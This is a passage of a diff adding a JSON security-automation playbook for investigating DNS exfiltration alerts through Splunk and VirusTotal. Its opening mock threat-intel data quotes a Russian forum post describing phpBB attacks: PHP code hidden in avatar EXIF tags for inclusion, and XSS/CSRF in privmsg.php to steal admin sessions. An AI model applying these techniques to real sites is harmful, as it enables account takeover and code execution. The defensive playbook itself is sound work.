\u0437\u0430\u043f\u0440\u043e\u0441 \u0432 \u0443\u0434\u0430\u043b\u0435\u043d\u043d\u043e\u043c \u0443\u0440\u043b\u0435 \u0430\u0432\u0430\u0442\u0430\u0440\u0430; \u0442\u0430\u043a\u0436\u0435 \u0444\u043e\u0440\u0443\u043c \u043d\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 \u043a\u043e\u043d\u0442\u0435\u043d\u0442 \u0437\u0430\u0433\u0440\u0443\u0436\u0430\u0435\u043c\u044b\u0445 \u0430\u0432\u0430\u0442\u0430\u0440\u0430\u0445 \u0432 EXIF \u0442\u044d\u0433\u0430\u0445, \u0442\u0443\u0434\u0430 \u043c\u043e\u043d\u0430 \u043f\u043e\u043c\u0435\u0441\u0442\u0438\u0442\u044c PHP-\u043a\u043e\u0434 \u0438 \u043f\u043e\u0442\u043e\u043c \u043a\u0430\u043a\u043d\u0438\u0442\u044c \u043f\u0440\u0438\u0438\u043d\u043a\u043b\u0443\u0434\u0438\u0442\u044c. \u0412\u043e\u0442.<br>\\nExploit: ]]&gt;<a>http:\/\/www.securityf...rchive\/1\/433858 [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/www.securityfocus.com\/archive\/1\/433858]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;<br>\\n\\n<br>\\n\\n<b>phpBB &lt;= 2.0.21<\/b>\\n<br>\\n\u0426\u0435\u043b\u044c: \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u0435\u0441\u0441\u0438\u0438 \u0430\u0434\u043c\u0438\u043d\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435: XSS \u043d\u0430\u043f\u0430\u0434\u0435\u043d\u0438\u0435 \u0438 CSRF \u0430\u0442\u0430\u043a\u0430<br>\\n\u041e\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0443\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u0438: 1)\u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0438\u0437-\u0437\u0430 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \u043d\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442 \u0432\u0430\u043b\u0438\u0434\u043d\u043e\u0441\u0442\u044c HTTP \u0437\u0430\u043f\u0440\u043e\u0441\u0430 \u043f\u0440\u0438 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0439. 2) \u0423\u044f\u0437\u0432\u0438\u043c\u043e\u0441\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0438\u0437-\u0437\u0430 \u043d\u0435\u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e\u0439 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u0432\u0445\u043e\u0434\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445 \u0432 \u043f\u043e\u043b\u0435 \\\"Message body\\\" \u0432 \u0441\u0446\u0435\u043d\u0430\u0440\u0438\u0438 privmsg.php.<br>\\nExploit: ]]&gt;<a>http:\/\/www.securityl...lity\/281494.php [http:\/\/forum.prologic.su\/go.php?http:\/\/url=http:\/\/www.securitylab.ru\/vulnerability\/281494.php]\\n\\t\\t\\t\\t\\t<\/a>]]&gt;\\n\\t\\t\\t\\t\\t\\n\\t\\t\\t\\t\\t<br>\\n\\t\\t\\t\\t\\t\\n\\t\\t\\t\\t\\n<\/article>\",\n              \"lastUpdated\": 1533723828818,\n              \"date\": 1199728945000\n            }\n          ],\n          \"Entities\": []\n        }\n        }",
+                "operationTitle": "Global Search",
+                "step_variables": {
+                    "reportID": "{{ vars.result.data.Reports | json_query('[*].uid')}}",
+                    "tagsList": "{{ vars.result | json_query('data.Reports[*].tags[]') | join(\",\")}}",
+                    "lengthReports": "{{ vars.result.data.Reports | length}}",
+                    "reportSubject": "{{ vars.result | json_query('data.Reports[*].subject')}}"
+                }
+            },
+            "status": null,
+            "top": "300",
+            "left": "1148",
+            "stepType": "\/api\/3\/workflow_step_types\/0bfed618-0316-11e7-93ae-92361f002671",
+            "uuid": "06be19d9-6a2e-4191-a463-484cc1b1bbff",
+            "id": 3233
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Increase Alert Severity",
+            "description": null,
+            "arguments": {
+                "resource": {
+                    "severity": {
+                        "id": 88,
+                        "@id": "\/api\/3\/picklists\/40187287-89fc-4e9c-b717-e9443d57eedb",
+                        "icon": null,
+                        "@type": "Picklist",
+                        "color": "#DE7A13",
+                        "display": "High",
+                        "listName": "\/api\/3\/picklist_names\/4e80cba3-032f-48b4-ac03-17e3ec247aac",
+                        "itemValue": "High",
+                        "orderIndex": 3
+                    }
+                },
+                "_showJson": false,
+                "collection": "{{vars.alertID}}",
+                "collectionType": "\/api\/3\/alerts",
+                "step_variables": []
+            },
+            "status": null,
+            "top": "820",
+            "left": "1874",
+            "stepType": "\/api\/3\/workflow_step_types\/b593663d-7d13-40ce-a3a3-96dece928722",
+            "uuid": "258ec3cc-e0a0-4356-8525-8fa8df2aaf29",
+            "id": 3234
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Raise Alert Severity",
+            "description": null,
+            "arguments": {
+                "message": {
+                    "tenant": "{{vars.input.records[0].tenant['@id']}}",
+                    "content": "<p><span style=\"font-size: 15px; color: #DE7A13;\" class=\"fa fa-exclamation-triangle\"><\/span>&nbsp;<em><strong>Virus Total<\/strong> reported the URL in the event,&nbsp;<span style=\"color: #ffcc00;\">{{vars.alertURL}}<\/span>, as <span style=\"background:#e31b1d; color: #fff;\" class=\"badge badge-pill badge-danger\"><strong>MALICIOUS<\/strong><\/span>. See attached Indicator, for more details<\/em>..<\/p>",
+                    "records": ""
+                },
+                "resource": {
+                    "severity": {
+                        "id": 88,
+                        "@id": "\/api\/3\/picklists\/40187287-89fc-4e9c-b717-e9443d57eedb",
+                        "icon": null,
+                        "@type": "Picklist",
+                        "color": "#DE7A13",
+                        "display": "High",
+                        "listName": "\/api\/3\/picklist_names\/4e80cba3-032f-48b4-ac03-17e3ec247aac",
+                        "itemValue": "High",
+                        "orderIndex": 3
+                    }
+                },
+                "_showJson": false,
+                "operation": "Append",
+                "collection": "{{vars.alertID}}",
+                "__recommend": [],
+                "collectionType": "\/api\/3\/alerts",
+                "fieldOperation": {
+                    "recordTags": "Append"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "740",
+            "left": "580",
+            "stepType": "\/api\/3\/workflow_step_types\/b593663d-7d13-40ce-a3a3-96dece928722",
+            "uuid": "65ab6e0c-ad90-41d6-b6ae-be00839431c1",
+            "id": 3235
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Start",
+            "description": null,
+            "arguments": {
+                "route": "aa4f8a6c-0c0e-4edd-9e64-e49e7b096cfd",
+                "title": "Investigate DNS Exfiltration",
+                "resources": [
+                    "alerts"
+                ],
+                "inputVariables": [],
+                "step_variables": {
+                    "input": {
+                        "records": "{{vars.input.records}}"
+                    }
+                },
+                "displayConditions": {
+                    "alerts": {
+                        "sort": [],
+                        "limit": 30,
+                        "logic": "AND",
+                        "filters": []
+                    }
+                },
+                "executeButtonText": "Execute",
+                "noRecordExecution": false,
+                "singleRecordExecution": false
+            },
+            "status": null,
+            "top": "30",
+            "left": "60",
+            "stepType": "\/api\/3\/workflow_step_types\/f414d039-bb0d-4e59-9c39-a8f1e880b18a",
+            "uuid": "ce93b6d9-c5cb-4837-b635-48db57e639e7",
+            "id": 3236
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Lookup Indicators Reputation",
+            "description": null,
+            "arguments": {
+                "params": {
+                    "iri": "{{vars.alertID}}\/indicators?reputation$in=7074e547-7785-4979-be32-c6d0c863e4bd",
+                    "body": "",
+                    "method": "GET"
+                },
+                "version": "2.1.0",
+                "connector": "cyops_utilities",
+                "operation": "make_cyops_request",
+                "operationTitle": "CyOPs: Make CyOPs API Call",
+                "step_variables": {
+                    "maliciousIndicators": "{{vars.result}}"
+                }
+            },
+            "status": null,
+            "top": "440",
+            "left": "400",
+            "stepType": "\/api\/3\/workflow_step_types\/0109f35d-090b-4a2b-bd8a-94cbc3508562",
+            "uuid": "c1d5676c-8aa6-41e1-a1ca-62e3d6c56cc6",
+            "id": 3237
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Add Note_Indicator Found Clean",
+            "description": null,
+            "arguments": {
+                "resource": {
+                    "type": {
+                        "id": 247,
+                        "@id": "\/api\/3\/picklists\/ff599189-3eeb-4c86-acb0-a7915e85ac3b",
+                        "icon": null,
+                        "uuid": "ff599189-3eeb-4c86-acb0-a7915e85ac3b",
+                        "@type": "Picklist",
+                        "color": null,
+                        "display": "Comment",
+                        "@context": "\/api\/3\/contexts\/Picklist",
+                        "listName": "\/api\/3\/picklist_names\/0841c1eb-a0a3-4abd-b29c-9f68e4d9b14f",
+                        "itemValue": "Comment",
+                        "orderIndex": 1
+                    },
+                    "alerts": "['{{vars.alertID}}']",
+                    "people": [],
+                    "tenant": "{{vars.input.records[0].tenant['@id']}}",
+                    "content": "<p><strong><span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\"><span style=\"color: #ffffff;\">Virus Total <\/span><\/span><\/span><\/strong><span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\"><span style=\"color: #ffffff;\">Reported the Query,<\/span><\/span><\/span><strong><span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\">&nbsp;<\/span><\/span><span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\"><span style=\"color: #ffffff;\">{{vars.alertURL}}<\/span><\/span><\/span><span style=\"color: #ff0000;\"><span style=\"color: #00ff00;\"> as Clean.<\/span><br><\/span><\/strong><\/p>",
+                    "__replace": "",
+                    "isImportant": false,
+                    "peopleUpdated": false
+                },
+                "_showJson": false,
+                "operation": "Overwrite",
+                "collection": "\/api\/3\/comments",
+                "__recommend": [],
+                "fieldOperation": {
+                    "recordTags": "Overwrite"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "740",
+            "left": "200",
+            "stepType": "\/api\/3\/workflow_step_types\/2597053c-e718-44b4-8394-4d40fe26d357",
+            "uuid": "a4aae29b-7fee-4079-9a66-006d4970ad6b",
+            "id": 3238
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Extract Query and Host From Event",
+            "description": null,
+            "arguments": {
+                "alertURL": "{{vars.alertMetaData.url}}",
+                "alertHost": "{{vars.alertMetaData.host}}"
+            },
+            "status": null,
+            "top": "140",
+            "left": "820",
+            "stepType": "\/api\/3\/workflow_step_types\/04d0cf46-b6a8-42c4-8683-60a7eaa69e8f",
+            "uuid": "b20590ee-133f-4ad3-b245-fabb02419d48",
+            "id": 3239
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Fetch and Store Events",
+            "description": null,
+            "arguments": {
+                "name": "Splunk",
+                "config": "73a58b11-c79e-4321-a480-d3d7fc80783b",
+                "params": {
+                    "sid": "{\"value\": \"{{vars.steps.Query_Latest_Events_For_Host.data.sid}}\"}",
+                    "additional_args": "{\"output_mode\":\"json\"}"
+                },
+                "version": "1.4.0",
+                "connector": "splunk",
+                "operation": "get_events",
+                "operationTitle": "Get Events for a Search",
+                "step_variables": {
+                    "threat_category": "{{vars.result.data.results[0].threat}}",
+                    "event_description": "{{vars.result.data.results[0].name}}"
+                }
+            },
+            "status": null,
+            "top": "600",
+            "left": "1680",
+            "stepType": "\/api\/3\/workflow_step_types\/0bfed618-0316-11e7-93ae-92361f002671",
+            "uuid": "c47a62ed-3c10-47cd-98d0-cf8f4955d48d",
+            "id": 3240
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Query Latest Events For Host",
+            "description": null,
+            "arguments": {
+                "name": "Splunk",
+                "config": "73a58b11-c79e-4321-a480-d3d7fc80783b",
+                "params": {
+                    "query": "sourcetype=\"dns_endpoint_log\" endpoint_id=\"{{vars.assetSerialNo}}\"",
+                    "exec_mode": "",
+                    "auto_cancel": "",
+                    "latest_time": "",
+                    "earliest_time": "",
+                    "additional_search_args": "{\"exec_mode\": \"blocking\",\"adhoc_search_level\":\"verbose\"}"
+                },
+                "message": {
+                    "tenant": "{{vars.input.records[0].tenant['@id']}}",
+                    "content": "<p><em>Getting latest information from Splunk for the<strong>&nbsp;Asset ID<\/strong> <\/em>-&nbsp;<span style=\"color: #ffcc00;\">{{vars.assetSerialNo}}<\/span><\/p>",
+                    "records": "['{{vars.alertID}}']"
+                },
+                "version": "1.6.2",
+                "connector": "splunk",
+                "operation": "invoke_search",
+                "operationTitle": "Invoke Search",
+                "step_variables": []
+            },
+            "status": null,
+            "top": "480",
+            "left": "1680",
+            "stepType": "\/api\/3\/workflow_step_types\/0bfed618-0316-11e7-93ae-92361f002671",
+            "uuid": "a1b88a87-a607-4eec-b865-224d8152df45",
+            "id": 3241
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Link Asset To Alert",
+            "description": null,
+            "arguments": {
+                "message": {
+                    "tenant": "{{vars.input.records[0].tenant['@id']}}",
+                    "content": "<p><em>Queried Asset Inventory for the host,&nbsp;<span style=\"color: #ffcc00;\">{{vars.alertHost}}<\/span>. Asset added under Correlations for more information<\/em>..<\/p>",
+                    "records": "['{{vars.alertID}}']"
+                },
+                "resource": {
+                    "__link": {
+                        "assets": "['{{vars.steps.Find_sourceIP_in_Asset_Inventory[0]['@id']}}']"
+                    }
+                },
+                "_showJson": false,
+                "operation": "Append",
+                "collection": "{{vars.alertID}}",
+                "__recommend": [],
+                "collectionType": "\/api\/3\/alerts",
+                "fieldOperation": {
+                    "recordTags": "Append"
+                },
+                "step_variables": []
+            },
+            "status": null,
+            "top": "380",
+            "left": "1680",
+            "stepType": "\/api\/3\/workflow_step_types\/b593663d-7d13-40ce-a3a3-96dece928722",
+            "uuid": "e58f78e8-aa30-4b7d-a3ad-4e51049b62aa",
+            "id": 3242
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Create Query Indicator",
+            "description": null,
+            "arguments": {
+                "message": {
+                    "tenant": "{{vars.input.records[0].tenant['@id']}}",
+                    "content": "<p><em>Adding and enriching&nbsp;suspected query, <span style=\"color: #ffcc00;\">{{vars.alertURL}}<\/span> in the event using <strong>VirusTotal<\/strong>...<\/em><\/p>",
+                    "records": "['{{vars.alertID}}']"
+                },
+                "resource": {
+                    "tlp": {
+                        "id": 315,
+                        "@id": "\/api\/3\/picklists\/7bff95b7-6438-4b01-b23a-0fe8cb5b33d3",
+                        "icon": null,
+                        "uuid": "7bff95b7-6438-4b01-b23a-0fe8cb5b33d3",
+                        "@type": "Picklist",
+                        "color": "#FFBF00",
+                        "display": "Amber",
+                        "@context": "\/api\/3\/contexts\/Picklist",
+                        "listName": "\/api\/3\/picklist_names\/40f1345f-f679-43c0-9237-5b06edd8385f",
+                        "itemValue": "Amber",
+                        "orderIndex": 1
+                    },
+                    "value": "{{vars.alertURL}}",
+                    "alerts": "['{{vars.alertID}}']",
+                    "__replace": "true",
+                    "reputation": {
+                        "id": 6435,
+                        "@id": "\/api\/3\/picklists\/ae98ebc6-beef-4882-9980-1d88fc6d87cd",
+                        "icon": null,
+                        "@type": "Picklist",
+                        "color": "#696969",
+                        "display": "TBD",
+                        "listName": "\/api\/3\/picklist_names\/e75ed3c3-9f23-4a43-832b-0daf236209ba",
+                        "itemValue": "TBD",
+                        "orderIndex": 3
+                    },
+                    "typeofindicator": {
+                        "id": 434,
+                        "@id": "\/api\/3\/picklists\/353a37b4-3eeb-43ee-aac6-64806422cfec",
+                        "icon": null,
+                        "@type": "Picklist",
+                        "color": null,
+                        "display": "URL",
+                        "listName": "\/api\/3\/picklist_names\/50ee5bfa-e18f-49ba-8af9-dcca25b0f9c0",
+                        "itemValue": "URL",
+                        "orderIndex": 9
+                    }
+                },
+                "_showJson": false,
+                "operation": "Overwrite",
+                "collection": "\/api\/3\/upsert\/indicators",
+                "__recommend": [],
+                "fieldOperation": {
+                    "recordTags": "Overwrite"
+                },
+                "step_variables": {
+                    "useMockOutput": "true"
+                }
+            },
+            "status": null,
+            "top": "300",
+            "left": "820",
+            "stepType": "\/api\/3\/workflow_step_types\/2597053c-e718-44b4-8394-4d40fe26d357",
+            "uuid": "9ce30ce0-ca34-478f-9c49-89784538df05",
+            "id": 3243
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Is Malicious Activity Found",
+            "description": null,
+            "arguments": {
+                "conditions": [
+                    {
+                        "option": "Yes",
+                        "step_iri": "\/api\/3\/workflow_steps\/258ec3cc-e0a0-4356-8525-8fa8df2aaf29",
+                        "condition": "{{ vars.threat_category in vars.threatCategories }}"
+                    },
+                    {
+                        "option": "No",
+                        "step_iri": "\/api\/3\/workflow_steps\/55a9ae5b-b4fe-49e1-a1d9-2f224f4a7cfc",
+                        "condition": "{{ true }}"
+                    }
+                ]
+            },
+            "status": null,
+            "top": "713",
+            "left": "1680",
+            "stepType": "\/api\/3\/workflow_step_types\/12254cf5-5db7-4b1a-8cb1-3af081924b28",
+            "uuid": "51b95794-49e5-4b30-8e89-fc31391b7a48",
+            "id": 3244
+        }
+    ],
+    "routes": [
+        {
+            "@type": "WorkflowRoute",
+            "name": "Start -> Config",
+            "targetStep": "\/api\/3\/workflow_steps\/b80f32bf-d192-4ae2-9560-788f78768f66",
+            "sourceStep": "\/api\/3\/workflow_steps\/ce93b6d9-c5cb-4837-b635-48db57e639e7",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "f061b63a-0482-4cb4-805b-87742ad38d31"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Copy  of Save Report as Cyops FIles -> Link Attachment",
+            "targetStep": "\/api\/3\/workflow_steps\/674113d6-f6cd-4706-8b2f-4f4a3b3a5283",
+            "sourceStep": "\/api\/3\/workflow_steps\/ee654143-dded-4942-83b0-017d015cfedd",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "57517187-ce8c-4fe5-abf7-ef9ed2c6391d"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Extract Query and Host From Event -> Find sourceIP in Asset Inventory",
+            "targetStep": "\/api\/3\/workflow_steps\/ea2368a7-673a-49c9-9e7a-652fd3162535",
+            "sourceStep": "\/api\/3\/workflow_steps\/b20590ee-133f-4ad3-b245-fabb02419d48",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "9c581add-71e3-4674-8c89-914acd46b614"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Extract URL From Event -> Create Indicator",
+            "targetStep": "\/api\/3\/workflow_steps\/9ce30ce0-ca34-478f-9c49-89784538df05",
+            "sourceStep": "\/api\/3\/workflow_steps\/b20590ee-133f-4ad3-b245-fabb02419d48",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "2d99ccb7-e1db-4f2c-a1f5-364953df1ad9"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Find sourceIP in Asset Inventory -> Link Asset To Alert",
+            "targetStep": "\/api\/3\/workflow_steps\/e58f78e8-aa30-4b7d-a3ad-4e51049b62aa",
+            "sourceStep": "\/api\/3\/workflow_steps\/ea2368a7-673a-49c9-9e7a-652fd3162535",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "dc78e444-1f2d-4724-b191-22f6410a7b1a"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Is Report Found -> Get Detailed Report",
+            "targetStep": "\/api\/3\/workflow_steps\/e534f8a9-fb8a-4e66-9010-36d8a2c561e4",
+            "sourceStep": "\/api\/3\/workflow_steps\/9954df6b-faad-46a1-9a2b-b397ab726eab",
+            "label": "Yes",
+            "isExecuted": false,
+            "uuid": "26b96490-9cca-4de7-8d56-facbb20b76ec"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Link Asset To Alert -> Query Latest Events For Host",
+            "targetStep": "\/api\/3\/workflow_steps\/a1b88a87-a607-4eec-b865-224d8152df45",
+            "sourceStep": "\/api\/3\/workflow_steps\/e58f78e8-aa30-4b7d-a3ad-4e51049b62aa",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "c8dc2b03-ca7a-48fd-8d6e-efef14e403ae"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Create Query Indicator -> Get Threat Intel Reports",
+            "targetStep": "\/api\/3\/workflow_steps\/06be19d9-6a2e-4191-a463-484cc1b1bbff",
+            "sourceStep": "\/api\/3\/workflow_steps\/9ce30ce0-ca34-478f-9c49-89784538df05",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "6ea3f0ec-0921-4f5b-a98a-465d80788c6d"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Create Query Indicator -> Wait For Enrichment",
+            "targetStep": "\/api\/3\/workflow_steps\/8c58bcb9-4ae3-49fa-972a-86a032131616",
+            "sourceStep": "\/api\/3\/workflow_steps\/9ce30ce0-ca34-478f-9c49-89784538df05",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "d4acb452-2747-42d5-b893-cc16bb92ddf1"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Is Indicator Malicious -> Raise Alert Severity",
+            "targetStep": "\/api\/3\/workflow_steps\/65ab6e0c-ad90-41d6-b6ae-be00839431c1",
+            "sourceStep": "\/api\/3\/workflow_steps\/45531c30-3f42-4dc1-875b-bfb688d375ab",
+            "label": "Yes",
+            "isExecuted": false,
+            "uuid": "4fc85229-3d4d-40ee-9855-15beebfd2543"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Get Threat Intel Reports -> Is Report Found",
+            "targetStep": "\/api\/3\/workflow_steps\/9954df6b-faad-46a1-9a2b-b397ab726eab",
+            "sourceStep": "\/api\/3\/workflow_steps\/06be19d9-6a2e-4191-a463-484cc1b1bbff",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "94b9856c-35a3-4cfa-8c29-5c066a1f71e4"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Save Report as Cyops FIles -> Copy  of Save Report as Cyops FIles",
+            "targetStep": "\/api\/3\/workflow_steps\/ee654143-dded-4942-83b0-017d015cfedd",
+            "sourceStep": "\/api\/3\/workflow_steps\/d5f2d71c-91ae-42f9-a553-345cae1cacda",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "b90e6f4a-1904-4c5e-9322-b6a20876faa9"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Is Malicious Activity Found -> Increase Alert Severity",
+            "targetStep": "\/api\/3\/workflow_steps\/258ec3cc-e0a0-4356-8525-8fa8df2aaf29",
+            "sourceStep": "\/api\/3\/workflow_steps\/51b95794-49e5-4b30-8e89-fc31391b7a48",
+            "label": "Yes",
+            "isExecuted": false,
+            "uuid": "5fb4f9a3-6727-45be-ac35-b5feb7192fe6"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Lookup Indicators Reputations -> Is Indicator Malicious",
+            "targetStep": "\/api\/3\/workflow_steps\/45531c30-3f42-4dc1-875b-bfb688d375ab",
+            "sourceStep": "\/api\/3\/workflow_steps\/c1d5676c-8aa6-41e1-a1ca-62e3d6c56cc6",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "0e286ba6-344d-4ff1-80cc-c03a9b12905d"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Is Report Found -> Copy  of Add Note Indicator Found Clean",
+            "targetStep": "\/api\/3\/workflow_steps\/c326df53-9e72-428d-a8ba-b5aa44aae662",
+            "sourceStep": "\/api\/3\/workflow_steps\/9954df6b-faad-46a1-9a2b-b397ab726eab",
+            "label": "No",
+            "isExecuted": false,
+            "uuid": "8c960ba4-eb17-4247-836b-8e8d2ee273c8"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Get Latest Events for Host -> Copy  of Get Latest Events for Host",
+            "targetStep": "\/api\/3\/workflow_steps\/c47a62ed-3c10-47cd-98d0-cf8f4955d48d",
+            "sourceStep": "\/api\/3\/workflow_steps\/a1b88a87-a607-4eec-b865-224d8152df45",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "dcf1775f-7350-4cd2-846e-b3ac62098637"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Get Detailed Report -> Save Report as Cyops FIles",
+            "targetStep": "\/api\/3\/workflow_steps\/d5f2d71c-91ae-42f9-a553-345cae1cacda",
+            "sourceStep": "\/api\/3\/workflow_steps\/e534f8a9-fb8a-4e66-9010-36d8a2c561e4",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "eb79cfa4-7aaf-49fe-89b2-e624be904644"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Increase Alert Severity -> Add Finding Notes",
+            "targetStep": "\/api\/3\/workflow_steps\/cc953580-74ac-4449-9faf-4af6d4108cc9",
+            "sourceStep": "\/api\/3\/workflow_steps\/258ec3cc-e0a0-4356-8525-8fa8df2aaf29",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "4ba6b4bc-4e76-47c4-9515-e74287af8138"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Fetch and Store Events -> Does event suggest malicious activity",
+            "targetStep": "\/api\/3\/workflow_steps\/51b95794-49e5-4b30-8e89-fc31391b7a48",
+            "sourceStep": "\/api\/3\/workflow_steps\/c47a62ed-3c10-47cd-98d0-cf8f4955d48d",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "01be7f43-67f2-40e8-9d24-310a7452ef2a"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Is Indicator Malicious -> Copy  of Add Finding Notes",
+            "targetStep": "\/api\/3\/workflow_steps\/a4aae29b-7fee-4079-9a66-006d4970ad6b",
+            "sourceStep": "\/api\/3\/workflow_steps\/45531c30-3f42-4dc1-875b-bfb688d375ab",
+            "label": "No",
+            "isExecuted": false,
+            "uuid": "55543f60-8307-4356-b700-82de07635db4"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Wait For Enrichment -> Lookup Indicators Reputations",
+            "targetStep": "\/api\/3\/workflow_steps\/c1d5676c-8aa6-41e1-a1ca-62e3d6c56cc6",
+            "sourceStep": "\/api\/3\/workflow_steps\/8c58bcb9-4ae3-49fa-972a-86a032131616",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "45a95280-1c0a-4fa3-9baf-d13ac7c8a8d3"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Is Malicious Activity Found -> No Action Needed1",
+            "targetStep": "\/api\/3\/workflow_steps\/55a9ae5b-b4fe-49e1-a1d9-2f224f4a7cfc",
+            "sourceStep": "\/api\/3\/workflow_steps\/51b95794-49e5-4b30-8e89-fc31391b7a48",
+            "label": "No",
+            "isExecuted": false,
+            "uuid": "c479e767-45c0-4428-91d2-13e319573b6e"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Link Attachment -> Copy  of Raise Alert Severity",
+            "targetStep": "\/api\/3\/workflow_steps\/a110f182-98ad-41e2-8015-7d19133a658b",
+            "sourceStep": "\/api\/3\/workflow_steps\/674113d6-f6cd-4706-8b2f-4f4a3b3a5283",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "1bfe18e0-52a4-489c-8d3a-d478a2fde867"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Config -> Start Investigation",
+            "targetStep": "\/api\/3\/workflow_steps\/ed21b55c-1e39-478d-925e-e72e706d4edb",
+            "sourceStep": "\/api\/3\/workflow_steps\/b80f32bf-d192-4ae2-9560-788f78768f66",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "ede7d6b1-5dec-412a-9bc7-61ba26ad8db4"
+        },
+        {
+            "@type": "WorkflowRoute",
+            "name": "Start Investigation -> Extract Query and Host From Event",
+            "targetStep": "\/api\/3\/workflow_steps\/b20590ee-133f-4ad3-b245-fabb02419d48",
+            "sourceStep": "\/api\/3\/workflow_steps\/ed21b55c-1e39-478d-925e-e72e706d4edb",
+            "label": null,
+            "isExecuted": false,
+            "uuid": "360bf3e7-295d-4c6e-9458-8d0fa8e1eaf4"
+        }
+    ],
+    "priority": null,
+    "uuid": "c45dffc1-b53b-471f-b36b-c767168fedf3",
+    "recordTags": [
+        "ManualAction"
+    ],
+    "id": 982,
+    "createUser": "\/api\/3\/appliances\/57545210-2adc-472b-a24f-2df6ee8dfe63",
+    "createDate": 1636433427,
+    "modifyUser": "\/api\/3\/appliances\/57545210-2adc-472b-a24f-2df6ee8dfe63",
+    "modifyDate": 1636433427,
+    "owners": [],
+    "isPrivate": false
+}
